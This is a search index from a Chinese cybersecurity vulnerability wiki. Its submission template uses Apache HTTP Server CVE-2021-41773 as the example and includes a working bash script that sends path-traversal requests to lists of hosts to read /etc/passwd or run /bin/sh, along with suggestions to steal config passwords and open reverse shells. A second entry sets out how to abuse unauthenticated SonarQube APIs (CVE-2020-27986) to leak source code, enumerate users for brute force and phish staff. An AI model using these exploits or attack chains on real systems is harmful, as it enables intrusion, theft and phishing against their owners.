{"./":{"url":"./","title":"Introduction","keywords":"","body":"/| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | A permanently free and open source knowledge base for cyber security | 一个永久免费 、开源的网络安全知识库 "},"杂七杂八/提交模板/":{"url":"杂七杂八/提交模板/","title":"提交模板","keywords":"","body":" 该目录内包含了一系列提交文章所用到的模板，请自行寻找适用于自己的模板，修改内容后打包发送至邮箱: team@onebit.tk /| .--. .--. . .--. || |__| _ _ |__| .'| |__| || .--. .| /\\ \\\\ // .--. .' | .--. || __ | | .' |_ `\\\\ //\\\\ // | | "},"杂七杂八/提交模板/漏洞文库模板.html":{"url":"杂七杂八/提交模板/漏洞文库模板.html","title":"漏洞文库模板","keywords":"","body":"CVE-xxx-xxx-xxx | xx >= 2.5.2 存在xxx漏洞 标题 格式为:CVE编号 | 版本简述、漏洞类型 0x00 漏洞说明 此段落简单明确的描写漏洞产生的影响 在Apache HTTP Server x.x.x.x 中对路径规范化所做的更改中发现了一个缺陷。攻击者可以使用路径遍历攻击穿越到服务器目录以外。在开启CGI配置后，将会从目录穿越 / 信息泄露升级为RCE。 0x01 影响版本 此段落描写受漏洞影响的软件版本 == Apache HTTP Server x.x.x.x 0x02 漏洞成因 此段落简明描写漏洞是由什么原因造成的，是哪个函数引发的漏洞等 由于在Apache HTTP Server x.x.x升级到 Apache HTTP Server x.x.x时，对路径规范化所做的更改中出现漏洞，该漏洞是由于 server/util.c\\ 中的 ap_normalize_path\\ 函数 一次解析一个 Unicode 值并在所有字符都被解码之前尝试检测遍历逻辑导致的。 当攻击者在 URL 中使用 /.%2e/\\ 时，第 572 行的逻辑不会将 %2e\\ 识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致 /.%2e/ 被 直接代入传递，导致目录穿越。 该漏洞默认配置情况下只存在目录遍历，但开启不受限制的 mod_cgi\\ 功能将会造成RCE 0x03 漏洞代码 此段落贴出该系统漏洞所在的代码块与文件目录，由于本文库使用了插件，可以在代码块上方使用 !FILENAME 的格式撰写 ，尽量不使用图片，图片或代码块下方可以简单描述 server/util.c # server/util.c 第 561 – 596 行 if (path[l] == '.') { /* Remove /./ segments */ if (IS_SLASH_OR_NUL(path[l + 1])) { l++; if (path[l]) { l++; } continue; } /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) { /* Wind w back to remove the previous segment */ if (w > 1) { do { w--; } while (w && !IS_SLASH(path[w - 1])); } else { /* Already at root, ignore and return a failure * if asked to. */ if (flags & AP_NORMALIZE_NOT_ABOVE_ROOT) { ret = 0; } } /* Move l forward to the next segment */ l += 2; if (path[l]) { l++; } continue; } } 0x04 详细分析 该段落主要撰写详细分析漏洞存在的原因，例如什么函数导致了什么 当攻击者在 URL 中使用 /.%2e/\\ 时，第 572 行的逻辑不会将 %2e\\ 识别为句号，此时该字符尚未被解码。但该版本Apache HTTP Servers并没有在这种情况下将整体URL进行解码并匹配目录穿越过滤，导致 /.%2e/ 被 直接代入传递，导致目录穿越，具体如下: server/util.c /* Remove /xx/../ segments */ if (path[l + 1] == '.' && IS_SLASH_OR_NUL(path[l + 2])) #上面的代码错误判断了目录穿越的payload，&& 判断只有在目录.的后面跟的是/或者空的时候才会触发次规则，并且没有解URL编码的%2e传入后并不会对%2e解码进行回溯验证，也不会对整体URL进行解码匹配，而是只识别了%,2,e #define IS_SLASH(s) (s == '/') #define IS_SLASH_OR_NUL(s) (s == '\\0' || IS_SLASH(s)) 0x05 漏洞指纹 该段落主要用于描写漏洞指纹或者特征截图,可选 fofa: title=\"apache\" 0x06 POC & EXP 主要存放一些用于该漏洞的EXP & POC，可以是漏洞复现，但要求尽量少用图片的方式，精简内容，比如截图漏洞点，文本描述漏洞复现经过，粘贴burp数据包等 exp.sh # Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal # Date: 10/05/2021 # Exploit Author: Lucas Souza https://lsass.io # Vendor Homepage: https://apache.org/ # Version: 2.4.49 # Tested on: 2.4.49 # CVE : CVE-2021-41773 # Credits: Ash Daulton and the cPanel Security Team #!/bin/bash if [[ $1 =3D=3D '' ]]; [[ $2 =3D=3D '' ]]; then echo Set [TAGET-LIST.TXT] [PATH] echo ./PoC.sh targets.txt /etc/passwd exit fi for host in $(cat $1); do curl --silent --path-as-is --insecure \"$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e$2\"; done # PoC.sh targets.txt /etc/passwd # PoC.sh targets.txt /bin/sh whoami 0x07 进阶利用思路 该段落描写一些自我理解和实战环境中的进阶利用思路 在特殊情况下可对网页配置文件进行读取，发现数据库连接密码等铭感信息 可使用bash直接反弹shell 0x08 冗余项 此段落不限制段落数量，根据需求添加 0x09 扩展链接 此段落主要撰写扩展阅读链接，以及详细分析该漏洞的文章等 Apache Httpd Cve 2021 41773 And Cve 2021 42013 漏洞详细分析 0x10 联系方式 此段落主要撰写该文章的联系方式，在审核结束后会根据作者意愿保留 / 删除 作者 : BitWiki支持团队 "},"漏洞文库/SonarQube/":{"url":"漏洞文库/SonarQube/","title":"SonarQube","keywords":"","body":"SonarQube（原Sonar）[3]是SonarSource开发的一个开源平台，用于持续检查代码质量，通过静态分析代码执行自动审查，以检测20 多种编程语言上的错误、代码异味和安全漏洞。SonarQube 提供关于重复代码、编码标准、单元测试、代码覆盖率、代码复杂性、注释)、错误的报告。, 和安全漏洞。 "},"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 8.4.2.x 存在API未授权访问漏洞.html":{"url":"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 8.4.2.x 存在API未授权访问漏洞.html","title":"CVE 2020 27986 SonarQube 8.4.2.X 存在API未授权访问漏洞","keywords":"","body":"CVE-2020-27986 | SonarQube 0x00 漏洞说明 在SonarQube 0x01 影响版本 SonarQube 0x02 漏洞成因 由于平台管理者未对默认的权限配置文件进行修改，导致API对外开放访问，且未对API使用进行有效的身份认证，导致执行高危操作，最终泄露平台托管的全部源代码、用户等敏感信息 0x03 详细分析 经过测试，以下API列表均可以在默认配置的情况下进行访问 #共57条 /api/ce/component /api/ce/task /api/ce/task_types /api/components/app /api/components/search /api/components/search_projects /api/components/suggestions /api/components/tree /api/duplications/show /api/emails/send /api/issues/changelog /api/issues/search /api/measures/component /api/measures/component_tree /api/measures/search /api/measures/search_history /api/metrics/search /api/metrics/search /api/metrics/types /api/navigation/component /api/navigation/global /api/navigation/settings /api/organizations/search /api/organizations/search_members /api/project_badges/measure /api/project_badges/quality_gate /api/project_branches/list /api/project_tags/search /api/project_tags/search /api/qualitygates/list /api/qualitygates/show?id=1 /api/qualityprofiles/importers /api/qualityprofiles/inheritance /api/qualityprofiles/search /api/qualityprofiles/show /api/rules/list /api/rules/repositories /api/rules/search /api/rules/show /api/rules/tags /api/rules/update /api/server/version /api/settings/list_definitions /api/settings/values /api/sources/index /api/sources/raw /api/sources/show /api/system/db_migration_status /api/system/migrate_db /api/system/status /api/system/upgrades /api/users/current /api/users/identity_providers /api/users/search /api/webservices/list /api/webservices/response_example /batch/project 其中有几个值得注意的API接口: PATH Description Response Contents Request Parameters 1 Request Parameters 2 Request Parameters 3 Availability after fix /api/server/version 返回应用的版本号 应用版本号 √ /api/settings/values 列出一些设定的值 可能会返回一些敏感信息，但是几率不大 × /api/users/search 列出活跃的用户 泄露几乎所有的用户列表，可以用于密码爆破 × /api/webservices/list 列出网络服务 返回一些api目录和api的详细信息 × /api/components/search_projects 搜索项目 返回敏感信息：organization、Project(ID)、Project(Key)等 × /api/components/tree 根据所选策略浏览组件 返回大量敏感信息：File(Key)、Project(Key)、Project(ID)等 component：Project(Key) componentId：Project(ID) × /api/emails/send 通过发送电子邮件测试电子邮件配置 需要先进行认证，但是认证成功后可以利用配置的邮箱进行钓鱼等横向操作 message：邮件内容 subject：邮件标题 to：目标邮箱 × /api/issues/search 阅读和更新Issues 返回敏感大量信息：issues(key)、File Key(Key)、project(Key)、author(Email)、与其他issues内容信息 × /api/issues/changelog 显示Issues的变更日志 如果有Issues的变更记录则返回 issue：Issue(key) × /api/measures/component_tree 获取具有指定度量的组件或子项 返回大量敏感信息：Project(ID)、File(Key)文件名等 metricKeys：ncloc,complexity,violations component：Project(Key) baseComponentId：Project(ID) × /api/navigation/component 获取有关当前用户的组件导航的信息。 返回少量敏感信息：project(Key)、organization、Project(ID)等 component：Project(Key) × /api/rules/list 列出规则，不包括手动规则和状态为 REMOVED 的规则 返回相关API规则信息 × /api/settings/list_definitions 列出API的设置定义 返回相关API定义内容 × /batch/project 返回项目存储库 返回指定项目中所有的存储库和文件目录以及其他敏感信息 key：Project(Key) × /api/sources/raw 以原始文本形式获取源代码 以原始文本形式获取指定文件的源代码(重点) key:File(Key) × /api/sources/index 获取源代码 获取指定文件的源代码(重点) key:File(Key) × /api/sources/show 以行号/文本对的形式获取源代码 以行号/文本对的形式获取指定文件的源代码(重点) key:File(Key) × 以下是一些参数的对应内容: API 上表对应值 API返回键 注释 /api/components/search_projects organization organization 所属组织名称 /api/components/search_projects Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/components/search_projects Project(Key) key 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/components/search_projects File(Key) key 后期参数需要的key，其格式为:: /api/components/tree File(Key) component 后期参数需要的key，其格式为:: /api/components/tree Project(Key) project 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/components/tree Project(ID) key 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/issues/search issues(key) key 标识每个issues，每个回复每个问题都有一个 /api/issues/search File (Key) component 后期参数需要的key，其格式为:: /api/issues/search Project(Key) project 这里的key一般与name单独计算，name是一些项目名称，key则还有可能是文件目录 /api/issues/search author(Email) author 发起此issues的用户邮箱，可用于钓鱼 /api/measures/component_tree Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/measures/component_tree File(Key) key 后期参数需要的key，其格式为::，但是该API存在项目名(根目录) /api/navigation/component project(Key) key 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 /api/navigation/component organization organization 所属组织名称 /api/navigation/component Project(ID) id 项目的唯一标识ID，并非至单一项目，项目中的每个目录、每个文件都拥有一个 0x05 漏洞指纹 fofa: app=\"sonarQube-代码管理\" 0x04 POC & EXP POC crul http://example.com/api/server/version EXP crul http://example.com/api/settings/values 0x05 进阶利用思路 一、验证漏洞 通过 /api/server/version 和 /api/settings/values 判断目标系统版本号与是否存在漏洞 二、弱口令 通过 /api/users/search 获取用户列表，对用户密码进行模糊测试 三、源代码泄露 通过 /api/components/search_projects 获取 organization 、Project(ID) 和 Project(Key) 等后续需要的信息 通过 /api/components/tree 或 /batch/project 并代入之前获取的 Project(ID) 和 Project(Key) 参数，获取 File(Key) ，也就是:和其他后续需要的信息 通过 /api/sources/raw 、 /api/sources/index 或 /api/sources/show 并带入之前获取的 File(Key) 参数，获取目标文件的源代码 四、可能存在的横向移动 通过 /api/issues/search 获取人员联络方式(邮件) 获取权限后通过 /api/emails/send 对其人员进行钓鱼攻击 0x06 扩展链接 Atw组织攻击分析及cve 2020 27986进阶利用 【安全事件】黑客利用开源代码平台SonarQube漏洞泄露多家单位源码 CVE-2020-27986 0x7 联系方式 作者 : 08174 "}}